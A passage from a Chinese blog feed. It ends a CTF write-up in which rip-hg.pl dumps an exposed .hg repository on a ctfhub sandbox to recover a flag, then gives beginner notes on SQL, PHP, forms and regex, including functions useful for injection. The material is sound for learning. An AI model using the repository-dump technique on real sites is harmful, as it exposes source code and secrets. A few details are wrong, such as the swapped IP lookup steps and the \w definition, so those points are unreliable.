参数，则默认从标准输入中读取数据。</li></ul><p>常用option参数</p><ul><li><code>-a</code> 或<code>--text</code>: 不要忽略二进制的数据。</li></ul><ul><li><code>-i</code>：忽略大小写进行匹配。</li><li><code>-v</code>：反向查找，只打印不匹配的行。</li><li><code>-n</code>：显示匹配行的行号。</li><li><code>-r</code>：递归查找子目录中的文件。</li><li><code>-l</code>：只打印匹配的文件名。</li><li><code>-c</code>：只打印匹配的行数。</li></ul></div><p>并未发现有用信息后开始手动遍历目录，并在以下目录发现flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827172247519.png" alt="image-20230827172247519"></p><h3 id="HG泄漏"><a href="#HG泄漏" class="headerlink" title="HG泄漏"></a>HG泄漏</h3><p>在result目录下执行<code>../rip-hg.pl -v -u http://challenge-461ad970cc7dbf6b.sandbox.ctfhub.com:10800/.hg/</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827182308097.png" alt="image-20230827182308097"></p><p>发现报错，使用ls -al扫描发现.hg文件夹依然下载成功</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827182438579.png" alt="image-20230827182438579"></p><p>使用tree列出.hg的目录</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827182529441.png" alt="image-20230827182529441"></p><p>使用grep匹配flag相关信息</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827182923705.png" alt="image-20230827182923705"></p><p>发现历史版本中存在flag_211812339.txt文件</p><p>在url后加上/flag_211812339.txt后得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF Web入门基础知识</title>
      <link href="/posts/e190f85f0a18/"/>
      <url>/posts/e190f85f0a18/</url>
      
        <content type="html"><![CDATA[<h2 id="计网知识"><a href="#计网知识" class="headerlink" title="计网知识"></a>计网知识</h2><p><strong>中间件的简要识别</strong></p><p>我们可以在<strong>响应标头中的Server值</strong>中找到网站使用的中间件</p><p>例如bilibili，使用的中间件为Tengine</p><img src="/posts/e190f85f0a18/image-20230811104345227.png" class="" title="image-20230811104345227"><p>在比如访问我的博客，可以看到返回的数据包中Server值为GitHub.com</p><img src="/posts/e190f85f0a18/image-20230811104504592.png" class="" title="image-20230811104504592"><p><strong>如何区分Linux和Windows操作系统</strong></p><ol><li>路径大小写，windows操作系统对大小写不敏感</li><li>盘符，盘符是windows特有</li></ol><p><strong>查询本机ip</strong></p><ol><li>公网，cmd输入<code>ipconfig</code></li><li>内网，百度搜索ip</li></ol><p><strong>关于localhost</strong></p><p>localhost实质上也是域名，所以要经过DNS解析</p><h2 id="后端基础"><a href="#后端基础" class="headerlink" title="后端基础"></a>后端基础</h2><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><p>所有的sql语句结尾一定要有英文分号字符：<code>;</code></p><h5 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h5><p><code>create database db_name;</code> 新建数据库</p><p><code>Show databases;</code> 查看所有数据库</p><p><code>drop database db_name;</code> 删除数据库</p><p><code>use db_name;</code> 进入数据库</p><p><code>select database;</code> 查询当前库名</p><h5 id="数据表操作"><a href="#数据表操作" class="headerlink" title="数据表操作"></a>数据表操作</h5><p><code>create table table_name(column_name column_type);</code> 新建表</p><p>column_name 和 column_type 为字段名和字段类型，不同字段中间用逗号<code>,</code>隔开</p><p>字段类型包括 varchar、int、float等</p><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create rable ctf(id int,score int);</span><br></pre></td></tr></table></figure><p><code>show tables;</code> 查看所有数据表</p><p><code>drop table table_name;</code> 删除表</p><p><code>desc table_name;</code> 查看表中的字段和类型</p><p><code>alter table table_name drop column_name;</code> 删除字段</p><p><code>alter table table_name add column_name column_type;</code> 添加字段</p><p><code>alter table table_name change column_name new_name new_type;</code> 修改字段</p><h5 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h5><p><code>insert into table_name (column_name1,column_name2...) values (value1,value2...);</code> 插入数据</p><p><code>select * from table_name where 条件;</code> 查询数据</p><p>此处*为通配符，可以替换为字段名，字段名之间以<code>,</code>分隔</p><p><code>update table_name set column_name=value where 条件;</code> 更新数据</p><p>在条件语句中可以使用and和or这种逻辑词</p><p><code>delete from table_name where 条件;</code> 删除数据</p><p>mysql的字符串数据可以接收不括在单引号内且以0x开头的16进制数（自动转换为字符串）</p><h4 id="高级查询与子查询"><a href="#高级查询与子查询" class="headerlink" title="高级查询与子查询"></a>高级查询与子查询</h4><h5 id="基础查询"><a href="#基础查询" class="headerlink" title="基础查询"></a>基础查询</h5><h6 id="结果排序（order-by）"><a href="#结果排序（order-by）" class="headerlink" title="结果排序（order by）"></a>结果排序（order by）</h6><p><code>select * from table_name order by column_name ASC(默认)/DESC;</code></p><p>ASC表示升序，DESC表示降序</p><h6 id="限制范围（limit）"><a href="#限制范围（limit）" class="headerlink" title="限制范围（limit）"></a>限制范围（limit）</h6><p><code>select * from table_name limit n,m;</code></p><p>n表示从第几行开始，m表示取几条</p><h6 id="模糊查询（like、-）"><a href="#模糊查询（like、-）" class="headerlink" title="模糊查询（like、%）"></a>模糊查询（like、%）</h6><p><code>select * from table_name where column_name like &#39;%value%&#39;;</code> </p><p>取出所有数据中包含value值的行</p><p><strong>通配符</strong>：% 表示可有零个或多个任意字符; _ 表示需要一个任意字符；</p><p>比如说<code>&#39;value%&#39;</code>则选取所有以value开头的数据</p><h6 id="逻辑运算符（and、or、not）"><a href="#逻辑运算符（and、or、not）" class="headerlink" title="逻辑运算符（and、or、not）"></a>逻辑运算符（and、or、not）</h6><p>一般用在<code>where</code>过滤查询后</p><p>逻辑规则与其他语言类似</p><h5 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h5><p><code>select语句1 union select语句2</code></p><p>同时展示多条查询语句的结果</p><p>若结果有重复，则只输出一次数据</p><p>使用<code>union all</code>可以让重复元素都显示</p><h5 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h5><p>将某条查询语句的结果放在另一条查询语句的条件中</p><p>优先执行括号中的查询语句</p><p>例如</p><p><code>select * from user where username = (select username from admin where id=1)</code></p><p>上述语句用于查询admin表中id=1的用户名是否也在user表中存在</p><h4 id="渗透测试常用函数"><a href="#渗透测试常用函数" class="headerlink" title="渗透测试常用函数"></a>渗透测试常用函数</h4><p><strong>sleep()</strong></p><p><code>sleep(n)</code> 延时n秒</p><p><strong>group_concat()</strong></p><p><code>group_concat(column_name)</code></p><p>将属于某一字段的数据连接成一个字符串并输出</p><p><strong>ascii()</strong></p><p><code>ascii(char)</code> 返回字符的ASCII码值</p><p><strong>database()</strong></p><p><code>select database();</code> 返回当前数据库名</p><p><strong>user()</strong></p><p><code>select user();</code> 返回当前登录用户名</p><p><strong>version()</strong></p><p><code>select version();</code> 返回MySQL服务器的版本</p><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>PHP（超文本预处理器）是一种脚本语言，主要适用于Web开发领域</p><p>php能和html代码混杂</p><h4 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h4><h5 id="语法规范"><a href="#语法规范" class="headerlink" title="语法规范"></a>语法规范</h5><p>php语句使用分号<code>;</code>结尾，不可遗漏</p><p>php代码段需要标记出来，共有四种标记风格</p><p>1.XML风格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><ul><li>php推荐使用的标记风格。</li><li>服务器管理员无法禁用，所有服务器上均可使用该风格。</li></ul><p>2.脚本风格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>默认开启，无法禁用</li><li>此处的php大小写均可</li></ul><p>3.简短风格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;? </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>此种风格需要在配置文件php.ini中启用short_open_tage选项</li><li>此种风格在许多环境中默认是不支持的</li></ul><p>4.ASP风格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;% </span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><ul><li>此种风格需要在配置文件php.ini中启用asp_tag选项</li><li>在默认情况下是禁用的</li></ul><h5 id="数据类型及变量"><a href="#数据类型及变量" class="headerlink" title="数据类型及变量"></a>数据类型及变量</h5><p>php是一种弱类型语言，类似于python</p><p>数据类型有String、Integer、Float、Boolean、Array、Object、NULL</p><p>声明变量时使用美元符<code>$</code>开头，如<code>$name;</code></p><p>引用变量时也需要在变量名前加上<code>$</code></p><p>声明常量时使用<code>define(常量名,常量值);</code></p><p>字符串拼接使用<code>.</code>而非<code>+</code></p><h5 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h5><p>自定义函数使用以下语法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 函数名(<span class="params">形参</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> 返回值;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>var_dump($变量名)</code>用于返回变量类型及长度</p><h5 id="条件和循环语句"><a href="#条件和循环语句" class="headerlink" title="条件和循环语句"></a>条件和循环语句</h5><p>语法与C语言类似</p><h4 id="PHP操作MySQL"><a href="#PHP操作MySQL" class="headerlink" title="PHP操作MySQL"></a>PHP操作MySQL</h4><p><strong>连接数据库</strong></p><p><code>$coon = mysqli_connect(&quot;IP&quot;,&quot;账号&quot;,&quot;密码&quot;,&quot;db_name&quot;);</code></p><p><strong>选择数据库（相当于执行SQL语句的USE）</strong></p><p><code>mysqli_select_db($conn,&quot;db_name&quot;);</code></p><p><strong>执行SQL语句</strong></p><p><code>$result = mysqli_query($conn,&quot;SQL语句&quot;);</code></p><p><strong>遍历查询结果</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(); <span class="comment">//返回一行</span></span><br><span class="line"><span class="variable">$table</span> = <span class="title function_ invoke__">mysqli_fetch_all</span>(); <span class="comment">//返回全部内容（一个表）</span></span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>); <span class="comment">//返回result操作后的内容</span></span><br></pre></td></tr></table></figure><p><strong>断开数据库连接</strong></p><p><code>mysqli_close($conn);</code></p><h4 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h4><h5 id="表单定义"><a href="#表单定义" class="headerlink" title="表单定义"></a>表单定义</h5><p>表单在网页中主要负责数据采集功能</p><div class="note info flat"><p><strong>网页表单</strong>（英语：WebForms）可以将用户输入的数据，发送到服务器进行处理。因为互联网的用户会操作复选框、单选按钮或文本框来填写网页上的表格，所以网页表单的形式类似文件或数据库的表单（form）。</p></div><p>一个表单有三个基本组成部分：</p><ol><li>表单标签：这里面包含了处理表单数据所用动态脚本的URL以及数据提交到服务器的方法</li><li>表单域：包含了文本框、密码框、隐藏域、多行文本框、复选框、单选框、下拉选择框和文件上传框等</li><li>表单按钮：包括提交按钮、复位按钮和一般按钮；用于将数据传送到服务器上的动态脚本或者取消输入，还可以用表单按钮来控制其他定义了处理脚本的处理工作</li></ol><p>表单标签:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>= <span class="string">&quot;URL&quot;</span> <span class="attr">method</span>= <span class="string">&quot;GET/POST&quot;</span> &gt;</span></span><br><span class="line"><span class="comment">&lt;!-- from标签中间可以是input或select等标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="获取表单"><a href="#获取表单" class="headerlink" title="获取表单"></a>获取表单</h5><p><code>$_GET</code>数组用于获取GET方式提交的内容</p><p><code>$_POST</code>数组用于获取POST方式提交的内容</p><p><code>$_COOKIE</code>数组用于获取COOKIE</p><div class="note info flat"><p><strong>HTTP cookie</strong>，简称<strong>cookie</strong>，又称“<strong>网站／浏览＋魔饼／魔片</strong>”等，是浏览网站时由网络服务器创建并由网页浏览器存放在用户计算机或其他设备的小文本文件。</p><p>Cookie使Web服务器能在用户的设备存储状态信息（如添加到在线商店购物车中的商品）或跟踪用户的浏览活动（如点击特定按钮、登录或记录历史）。</p><p>Cookie的<strong>基本结构</strong>包括</p><ol><li>名；</li><li>值；</li><li>各种属性。</li></ol><p>cookie可以分为以下<strong>类别</strong>：</p><p><strong>会话cookie</strong></p><p>会话cookie仅在浏览网站时临时存储，关闭浏览器后会自动过期或删除。</p><p><strong>持久cookie</strong></p><p>持久cookie只在其创建者设置的特定日期后过期，期间一直有效。</p><p><strong>安全cookie</strong></p><p>安全cookie只能通过加密连接传输HTTPS。它们不能通过未加密的连接传输HTTP，使cookie不易被盗。</p></div><p><code>$_REQUEST</code>数组用于获取GET|POST|COOKIE的内容（具体存储哪些种类依赖于PHP的版本）</p><p>想要接收指定表单内容时，接收变量需要与form标签的<code>method</code>属性匹配，数组索引需要与提交标签的<code>name</code>属性匹配</p><p>演示如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// xxx.html</span><br><span class="line">&lt;form action= &quot;xxx.php&quot; method= &quot;GET&quot; &gt;</span><br><span class="line">&lt;input type=&#x27;text&#x27; name=&#x27;flag&#x27; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">// xxx.php</span><br><span class="line">&lt;?php</span><br><span class="line">$flag = $_GET[&#x27;flag&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><div class="note info flat"><p><strong>正则表达式</strong>（英语：Regular expression，常简写为regex、regexp或RE），又称<strong>规律表达式</strong>、<strong>正规</strong>、<strong>正规表示法</strong>、<strong>规则运算式</strong>、<strong>常规表示法</strong>，是计算机科学概念，用简单字串来描述、匹配文中全部符合指定格式的字串.</p><p>正则表达式的用途有：</p><ol><li>判断字符串是否符合某一规则</li><li>从一个字符串中找出符合规则的所有子字符串</li></ol></div><p>php有如下与正则表达式有关的函数</p><h5 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$subject</span>,<span class="variable">$matches</span>);</span><br></pre></td></tr></table></figure><ul><li>此处<code>$pattern</code>为正则表达式,<code>$subject</code>为待匹配的字符串，<code>$matches</code>表示存储匹配结果的数组</li><li>若待匹配字符串包含正则表达式模式，则<code>$result</code>为1，且<code>$matches</code>中会存入第一个匹配到的结果</li></ul><h5 id="preg-match-all"><a href="#preg-match-all" class="headerlink" title="preg_match_all()"></a>preg_match_all()</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$pattern</span>,<span class="variable">$subject</span>,<span class="variable">$matches</span>);</span><br></pre></td></tr></table></figure><ul><li><strong>preg_match_all</strong>与<strong>preg_match</strong>的区别在于，它会将所有匹配到的结果都存入<code>$matches</code>中，且<code>$result</code>中返回的是匹配到的总次数</li><li>可以理解为<strong>preg_match</strong>在第一次匹配到之后就停止匹配</li></ul><h5 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>,<span class="variable">$replacement</span>,<span class="variable">$subject</span>);</span><br></pre></td></tr></table></figure><ul><li>此处<code>$replacement</code>为要替换成的内容，<code>$result</code>为替换之后的结果</li></ul><h5 id="正则表达式模式"><a href="#正则表达式模式" class="headerlink" title="正则表达式模式"></a>正则表达式模式</h5><div class="note warning flat"><p>正则表达式模式的开始和结尾处均需要加上<code>/</code>符号，在结尾处的<code>/</code>符号后可以添加修饰符</p></div><p><strong>元字符</strong></p><div class="table-container"><table><thead><tr><th>元字符</th><th>行为</th><th>示例</th></tr></thead><tbody><tr><td>*</td><td>零次或多次匹配前面的字符或子表达式，等效于{0,}</td><td>zo* 与 “z”和“zoo”匹配</td></tr><tr><td>+</td><td>一次或多次匹配前面的字符或子表达式，等效于{1,}</td><td>zo+ 与 “zo”和“zoo”匹配，但与“z”不匹配</td></tr><tr><td>?</td><td>零次或一次匹配前面的字符或子表达式，等效于{0,1} 当 ? 紧随任何其他限定符（*、+、?、{n}、{n,} 或 {n,m}）之后时，匹配模式是非贪婪的。非贪婪模式匹配搜索到的、尽可能少的字符串，而默认的贪婪模式匹配搜索到的、尽可能多的字符串</td><td>zo? 与“z”和“zo”匹配，但与“zoo”不匹配 o+? 只与“oooo”中的单个“o”匹配，而 o+ 与所有“o”匹配 do(es)? 与“do”或“does”中的“do”匹配</td></tr><tr><td>^</td><td>匹配搜索字符串开始的位置。如果标志中包括 m（多行搜索）字符，^ 还将匹配 \n 或 \r 后面的位置。如果将 ^ 用作括号表达式中的第一个字符，就会对字符集取反</td><td>^\d{3} 与搜索字符串开始处的 3 个字符匹配 [^abc] 与除 a、b、c 以外的任何字符匹配</td></tr><tr><td>$</td><td>匹配搜索字符串结束的位置。如果标志中包括 m（多行搜索）字符，^ 还将匹配 \n 或 \r 前面的位置。</td><td>\d{3}$ 与搜索字符串结尾处的 3 个数字匹配</td></tr><tr><td>.</td><td>匹配除换行符 \n 之外的任何单个字符。若要匹配包括 \n 在内的任意字符，请使用诸如 [\s\S] 之类的模式</td><td>a.c 与 “abc”“a1c”和“a-c”匹配</td></tr><tr><td>[]</td><td>标记括号表达式的开始和结尾</td><td>[1-4] 与“1”、“2”、“3”或“4”匹配 [^aAeEiIoOuU] 与任何非元音字符匹配</td></tr><tr><td>{}</td><td>标记限定符表达式的开始和结尾</td><td>a{2,3} 与“aa”和“aaa”匹配</td></tr><tr><td>()</td><td>标记子表达式的开始和结尾，可以保存子表达式，以备将来之用</td><td>A(\d) 与“A0”至“A9”匹配。保存该数字以备将来之用</td></tr><tr><td>&#124;</td><td>指示两个或多个项之间进行选择</td><td>z&#124;food与“z”或“food”匹配 (z&#124;f)ood 与 “zood”或“food”匹配</td></tr><tr><td>/</td><td>表示 JavaScript 中的文本正则表达式模式的开始和结尾。在第二个 “/”后添加单字符标志可以指定搜索行为</td><td>/abc/gi 是与 “abc”匹配的 JavaScript 文本正则表达式。g（全局）标志指定查找模式的所有匹配项，i（忽略大小写）标志使搜索不区分大小写</td></tr><tr><td>\</td><td>将下一字符标记为特殊字符、文本、反向引用或八进制转义符</td><td>\n 与换行符匹配。( 与 “(”匹配。\ 与 “\”匹配</td></tr></tbody></table></div><p>这些特殊字符在括号表达式内出现时就会失去它们的意义，变成普通字符。若要匹配这些特殊字符，必须首先转义字符，即在字符前面加反斜杠<code>\</code>。例如，若要搜索<code>+</code>文本字符，则可使用表达式<code>\+</code>。</p><p>除了以上单字符元字符外，还有一些多字符元字符，如下表所示：</p><div class="table-container"><table><thead><tr><th>元字符</th><th>行为</th><th>示例</th></tr></thead><tbody><tr><td>\b</td><td>与一个字边界匹配。即字与空格间的位置</td><td>er\b 与 “never”中的“er”匹配，但与“verb”中的“er”不匹配</td></tr><tr><td>\B</td><td>非边界字匹配</td><td>er\B 与“verb”中的“er”匹配，但与“never”中的“er”不匹配</td></tr><tr><td>\d</td><td>数字字符匹配，等效于[0-9]</td><td>在搜索字符串“12 345”中，\d{2} 与“12”和“34”匹配。\d 与“1”，“2”、“3”、“4”和“5”匹配</td></tr><tr><td>\D</td><td>非数字字符匹配，等效于[^0-9]</td><td>/D+ 与“abc123 def”中的“abc”和“def”匹配</td></tr><tr><td>\w</td><td>与 A-Z、a-z、0-9 和下划线中的任意任意字符匹配，等效于[A-Za-z0-9]</td><td>在搜索字符串“The quick brown fox…”中，\w+ 与“The”、“quick”、“brown”和“fox”匹配</td></tr><tr><td>\W</td><td>与除 A-Z、a-z、0-9 和下划线以外的任意字符匹配，等效于[^A-Za-z0-9]</td><td>在搜索字符串“The quick brown fox…”中，\W+ 与“…”和所有空格匹配</td></tr><tr><td>\s</td><td>匹配任何空白字符，包括空格、制表符、换页符等等。等价于[ \f\n\r\t\v]。注意：Unicode正则表达式会匹配全角空格符。</td><td>在搜索字符串“Catch the flag”中，\s会与中间的两个空格匹配</td></tr><tr><td>\S</td><td>匹配任何非空白字符。等价于[^ \f\n\r\t\v]。</td><td>在搜索字符串“Catch the flag”中，\S会与除中间的两个空格外的所有字符匹配，共匹配到12次</td></tr><tr><td>[xyz]</td><td>字符集，与任何一个指定字符匹配</td><td>[abc] 和 “plain”中的“a”匹配</td></tr><tr><td>[^xyz]</td><td>反向字符集，与未指定的任何字符匹配</td><td>[^abc] 与“plain”中的“p”、“l”、“i”和“n”匹配</td></tr><tr><td>[a-z]</td><td>字符范围，匹配指定范围内的任何字符</td><td>[a-z] 与“a”到“z”范围内的任何小写字母字符匹配</td></tr><tr><td>[^a-z]</td><td>反向字符范围，与不在指定范围内的任何字符匹配</td><td>[^a-z]`与不在范围“a”到“z”内的任何字符匹配</td></tr><tr><td>{n}</td><td>正好匹配 n 次，n 是非负整数</td><td>o{2} 与“Bob”中的“o”不匹配，但与“fooood”中的两个“o”匹配</td></tr><tr><td>{n,}</td><td>至少匹配 n 次，n 是非负整数 * 与 {0,} 相等 + 与 {1,} 相等</td><td>o{2} 与“Bob”中的“o”不匹配，但与“fooood”中的所有“o”匹配</td></tr><tr><td>{n,m}</td><td>匹配至少 n 次，至多 m 次。n 和 m 是非负整数，其中 n&lt;= m，逗号和数字之间不能有空格 ? 与 {0,1} 相等</td><td>在搜索字符串“1234567”中，\d{1,3} 与“123”、“456”和“7”匹配</td></tr><tr><td>(模式)</td><td>与模式匹配并保存匹配项。可以从由 JavaScript 中的 exec Method 返回的数组元素中检索保存的匹配项。若要匹配括号字符()，请使用“(”或者“)”</td><td>(Chapter&#124;Section) [1-9]与 “Chapter 5”匹配，保存“Chapter”以备将来之用</td></tr><tr><td>(?:模式)</td><td>与模式匹配，但不保存匹配项，即不会存储匹配项以备将来之用。这对于用“or”字符(&#124;)组合模式部件的情况很有用</td><td>industry(?:y&#124;ies) 与 industry&#124;industries相等</td></tr><tr><td>(?=模式)</td><td>正预测先行。找到一个匹配项后，将在匹配文本之前开始搜索下一个匹配项。不会保存匹配项以备将来之用</td><td>^(?=_.*\d.{4,8}&#36;对密码应用以下限制： 其长度必须介于 4 到 8 字符之间，并且必须至少包含一个数字，在该模式中，*\d 查找后跟有数字的任意多个字符。对于搜索字符串“abc3qr”，与“abc3”匹配。 从该匹配项之前，（而不是之后）开始，{4,8} 与包含 4~8 个字符的字符串匹配，与“abc3qr”匹配。 \^ 和美元符指定搜索字符串的开始和结束位置，将在搜索字符串包含匹配字符之外的任何字符时阻止匹配</td></tr><tr><td>(?!模式)</td><td>负预测先行。匹配与模式不匹配的搜索字符串。找到一个匹配项后，将在匹配文本之前开始搜索下一个匹配项。不会保存匹配项以备将来之用</td><td>\b(?!th)/w+\b 与不以“th”开头的单词匹配在该模式中，\b 与一个字边界匹配。对于搜索字符串“quick”，与第一个空格匹配。(?!th) 与非“th”字符串匹配与“qu”匹配，从该匹配项开始，!w+ 与一个字匹配，即与“quick”匹配</td></tr><tr><td>\cx</td><td>匹配 x 指示的控制字符。x 的值必须在 A-Z 或 a-z 范围内。如果不是这样，就假定 c 是文本“c”字符本身</td><td>\cM 与 Ctrl+M 或一个回车符匹配</td></tr><tr><td>\xn</td><td>匹配 n，此处的 n 是一个十六进制转义码。十六进制转义码必须正好是两位数长。允许在正则表达式中使用 ASCII 代码</td><td>\x41 与“A”匹配、\x41 等效于后跟有“1”的“\x04”（因为 n 必须正好是两位数）</td></tr><tr><td>\num</td><td>匹配 num，此处的 num 是一个正整数。这是对以保存的匹配项的引用</td><td>(.)\1 与两个连续的相同字符匹配</td></tr><tr><td>\n</td><td>标识一个八进制转义码或反向引用。如果 \n 前面至少有 n 个捕获子表达式，那么 n 是反向引用；否则，如果 n 是八进制数（0-7），那么 n 是八进制转义码</td><td>(\d)\1 与两个连续的相同数字匹配</td></tr><tr><td>\nm</td><td>标识一个八进制转义码或反向引用。如果 \nm 前面至少有 nm 个捕获子表达式，那么 nm 是反向引用。如果 \nm 前面至少有 n 个捕获子表达式，则 n 是反向引用，后面跟有文本 m。如果上述情况都不存在，当 n 和 m 是八进制数字（0-7）时，\nm 匹配八进制转义码 nm</td><td>\11 与制表符匹配</td></tr><tr><td>\nml</td><td>当 n 是八进制数字（0-3）、m 和 1 是八进制数字（0-7）时，匹配八进制转义码 nml</td><td>\011 与制表符匹配</td></tr><tr><td>\un</td><td>匹配 n，其中 n 是以 4 位十进制数字表示的 Unicode 字符</td><td>\u00A9 与版权符号（©️）匹配</td></tr></tbody></table></div><p><strong>非打印字符</strong></p><p>非打印字符是由普通字符与转义字符组成，用来在正则表达式中匹配特定行为的字符，如换行、换页、空白符等。下表列出了非打印字符。</p><div class="table-container"><table><thead><tr><th>字符</th><th>匹配</th><th>等效于</th></tr></thead><tbody><tr><td>\f</td><td>换页符</td><td>\x0c 和 \cL</td></tr><tr><td>\n</td><td>换行符</td><td>\x0a 和 \cJ</td></tr><tr><td>\r</td><td>回车符</td><td>\x0d 和 \cM</td></tr><tr><td>\s</td><td>任何空白字符，包括空格、制表符和换页符</td><td>[\f\b\r\t\v]</td></tr><tr><td>\S</td><td>任何非空白字符</td><td>[^\f\b\r\t\v]</td></tr><tr><td>\t</td><td>Tab 字符</td><td>\x09 和 \cI</td></tr><tr><td>\v</td><td>垂直制表符</td><td>\x0b 和 \cK</td></tr></tbody></table></div><p><strong>优先级</strong></p><p>在使用正则表达式时，需要注意匹配的顺序。通常相同优先级是从左到右进行运算的，不同优先级的运算先高后低。各种操作符的匹配顺序优先级从高到低，如下表所示：</p><div class="table-container"><table><thead><tr><th>顺序</th><th>元字符</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>\</td><td>转义符</td></tr><tr><td>2</td><td>( )、(?:)、(?=)、[ ]</td><td>括号和中括号</td></tr><tr><td>3</td><td>*、+、{n}、{n，}、{n,m}</td><td>限定符</td></tr><tr><td>4</td><td>^、$、\ 任何元字符</td><td>定位点和序列</td></tr><tr><td>5</td><td>&#124;</td><td>替换</td></tr></tbody></table></div><p>另外，字符具有高于替换运算符的优先级，例如，允许 “m|food” 匹配 “m” 或 “food”。</p><p><strong>修饰符</strong></p><p>修饰符是对正则表达式模式进行修饰的特殊符号，主要包括以下几个：</p><ul><li><code>i</code>：表示匹配时不区分大小写</li><li><code>m</code>：表示进行多行匹配</li><li><code>s</code>：表示<code>.</code>元字符可以匹配任意字符，包括换行符</li><li><code>x</code>：表示忽略空白字符和注释</li><li><code>u</code>：表示开启UTF-8模式</li></ul><p><strong>零碎知识点</strong></p><p>正则表达式的末尾会自动加上结尾符，用<code>*</code>进行匹配时能比较直观地观察到，比如用<code>1*</code>来匹配字符串<code>ab</code>时，一共会匹配到3次，这其中就包含了匹配到结尾符</p><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><h5 id="isset"><a href="#isset" class="headerlink" title="isset()"></a>isset()</h5><p><strong>isset()</strong> 函数用于检测变量是否已设置并且非 NULL。</p><p>如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。</p><p>若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。</p><h5 id="mt-srand-、srand-、mt-rand-、rand"><a href="#mt-srand-、srand-、mt-rand-、rand" class="headerlink" title="mt_srand()、srand()、mt_rand()、rand()"></a>mt_srand()、srand()、mt_rand()、rand()</h5><p>mt_rand(min,max) 函数使用 